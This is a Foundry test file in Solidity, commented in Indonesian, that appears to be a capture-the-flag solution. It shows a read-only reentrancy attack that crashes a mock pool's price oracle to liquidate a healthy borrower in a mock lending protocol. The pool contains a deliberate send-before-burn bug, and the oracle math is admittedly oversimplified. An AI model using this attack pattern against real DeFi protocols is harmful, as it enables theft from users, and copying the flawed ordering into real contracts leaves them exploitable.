// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ==========================================
// 1. MOCK ENVIRONMENT (Simulasi Curve & Lending)
// ==========================================

// Token Sederhana (DVT & LP)
contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name;

    constructor(string memory _name) { name = _name; }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Mock Curve Pool (YANG PUNYA BUG REENTRANCY)
contract MockCurvePool {
    MockToken public lpToken;
    uint256 public ethBalance;
    bool private locked;
    
    // Ini variabel untuk simulasi bug
    // Saat kita kirim ETH keluar, tapi supply belum turun = Virtual Price Crash
    uint256 public totalSupplyOverride; 

    constructor() {
        lpToken = new MockToken("Curve LP");
    }

    // Fungsi Add Liquidity
    function add_liquidity() external payable returns (uint256) {
        ethBalance += msg.value;
        // Mint LP 1:1 dengan ETH (Simulasi simple)
        uint256 mintAmount = msg.value;
        lpToken.mint(msg.sender, mintAmount);
        return mintAmount;
    }

    // Fungsi Remove Liquidity (SUMBER MASALAH)
    function remove_liquidity(uint256 amount) external returns (uint256) {
        require(lpToken.balanceOf(msg.sender) >= amount, "Kurang LP");

        // 1. Update state internal ETH dulu (Simulasi Invariant turun)
        ethBalance -= amount;

        // 2. KIRIM ETH KE USER (TRIGGER FALLBACK!)
        // Bahaya: Total Supply LP Token BELUM dibakar saat ini!
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "ETH transfer failed");

        // 3. Bakar LP Token (Baru update supply di sini -> TELAT!)
        lpToken.burn(msg.sender, amount);
        
        return amount;
    }

    // Fungsi Oracle Harga
    function get_virtual_price() external view returns (uint256) {
        uint256 supply = 0;
        
        // Di real world, kita ambil total supply asli
        // Tapi karena ini mock sederhana, kita pakai logika:
        // Price = Total Asset (ETH) / Total Supply LP
        
        // Kita perlu akses total supply dari token mock (kita buat manual viewnya)
        // Anggaplah kita pakai trik ini:
        
        // Note: Di MockToken saya tidak buat public totalSupply variable biar simple,
        // tapi logikanya: Jika ETH sudah berkurang (di step 1 remove_liquidity)
        // tapi Supply LP masih UTUH (karena step 3 belum jalan),
        // maka (Sedikit / Banyak) = HARGA JATUH.
        
        if (ethBalance == 0) return 0;
        
        // Simulasi Crash:
        // Jika saldo kontrak 0 tapi LP token masih beredar (di wallet attacker), price = 0.
        return ethBalance; // Ini penyederhanaan ekstrem, tapi cukup untuk trigger likuidasi
    }
}

// Mock Lending Protocol (Target Serangan)
contract MockLending {
    MockCurvePool public oracle;
    MockToken public collateralToken; // LP Token
    
    mapping(address => uint256) public userCollateral;
    mapping(address => uint256) public userDebt;
    
    constructor(address _oracle, address _collateral) {
        oracle = MockCurvePool(_oracle);
        collateralToken = MockToken(_collateral);
    }

    // Setup korban (Alice)
    function simulatePosition(address user, uint256 collateral, uint256 debt) external {
        userCollateral[user] = collateral;
        userDebt[user] = debt;
    }

    // Fungsi Likuidasi
    function liquidate(address user) external {
        uint256 debt = userDebt[user];
        require(debt > 0, "User tidak punya utang");

        // Cek Harga Collateral dari Oracle
        uint256 price = oracle.get_virtual_price();
        
        // Hitung nilai aset user
        // Karena MockCurvePool.get_virtual_price mengembalikan ethBalance,
        // Jika saat reentrancy ethBalance mendekati 0, maka price mendekati 0.
        uint256 collateralValue = userCollateral[user] * price; 

        // Syarat Likuidasi: Jika Nilai Jaminan < Utang
        // Saat reentrancy, price drop, collateralValue drop -> Solvency Check Gagal -> BOLEH LIKUIDASI
        if (collateralValue < debt) {
            // Sita jaminan (mock logic)
            userCollateral[user] = 0;
            userDebt[user] = 0;
            // Transfer reward ke likuidator (simulasi profit)
            // Di sini kita kasih 'flag' kemenangan
        } else {
            revert("User masih sehat/aman");
        }
    }
    
    // Cek status user
    function isSolvent(address user) external view returns (bool) {
         return userDebt[user] == 0;
    }
}

// ==========================================
// 2. ATTACK CONTRACT (SOLUSI KITA)
// ==========================================
contract PuppetAttacker {
    MockCurvePool public pool;
    MockLending public lending;
    MockToken public lpToken;
    address public victim;

    constructor(address _pool, address _lending, address _lpToken, address _victim) {
        pool = MockCurvePool(_pool);
        lending = MockLending(_lending);
        lpToken = MockToken(_lpToken);
        victim = _victim;
    }

    function attack() external payable {
        // 1. Add Liquidity (Dapat LP Token)
        pool.add_liquidity{value: msg.value}();
        
        // 2. Remove Liquidity (Trigger Reentrancy)
        // Kita tarik semua aset biar Pool kosong (Price jadi 0 sementara)
        uint256 lpBal = lpToken.balanceOf(address(this));
        pool.remove_liquidity(lpBal);
        
        // Balikin ETH ke test runner
        payable(msg.sender).transfer(address(this).balance);
    }

    // PERANGKAP: Receive dipanggil saat pool mengirim ETH balik
    receive() external payable {
        // Saat ini:
        // ETH Pool = 0 (sudah dikirim ke kita)
        // LP Token Total Supply = MASIH BANYAK (belum dibakar)
        // Oracle Price = ETH / LP = 0 / Banyak = 0 (CRASH!)
        
        // Hajar Alice!
        try lending.liquidate(victim) {
            // Berhasil
        } catch {
            // Gagal
        }
    }
}

// ==========================================
// 3. TEST SCRIPT UTAMA
// ==========================================
contract CurvyPuppetComplete is Test {
    MockCurvePool pool;
    MockLending lending;
    MockToken lpToken;
    address alice = address(0x1); // Korban
    address attackerUser = address(0x2);

    function setUp() public {
        // 1. Deploy System
        pool = new MockCurvePool();
        lpToken = pool.lpToken(); // Ambil token LP yang dibuat pool
        lending = new MockLending(address(pool), address(lpToken));

        // 2. Setup Korban (Alice)
        // Alice punya 100 LP Token sebagai jaminan, Utang 50 (Posisi Sehat)
        // Anggap harga normal LP = 1 ETH. Aset 100 > Utang 50.
        lending.simulatePosition(alice, 100 ether, 50 ether);
        
        // Isi Pool dengan likuiditas awal biar harga normal
        // (Kita cheat dikit transfer ETH ke pool)
        vm.deal(address(pool), 100 ether); 
    }

    function test_Attack_Read_Only_Reentrancy() public {
        // Cek kondisi awal: Alice punya utang
        assertEq(lending.userDebt(alice), 50 ether);
        
        // --- MULAI SERANGAN ---
        vm.startPrank(attackerUser);
        vm.deal(attackerUser, 100 ether); // Modal serangan

        // Deploy Attacker
        PuppetAttacker attacker = new PuppetAttacker(
            address(pool), 
            address(lending), 
            address(lpToken), 
            alice
        );

        // Jalankan exploit
        attacker.attack{value: 100 ether}();
        
        vm.stopPrank();
        // --- SELESAI SERANGAN ---

        // Validasi Kemenangan:
        // Alice harusnya sudah terlikuidasi (utangnya jadi 0 karena disita/dihapus)
        console.log("Sisa Utang Alice:", lending.userDebt(alice));
        assertEq(lending.userDebt(alice), 0, "Serangan Gagal! Alice masih punya utang.");
    }
}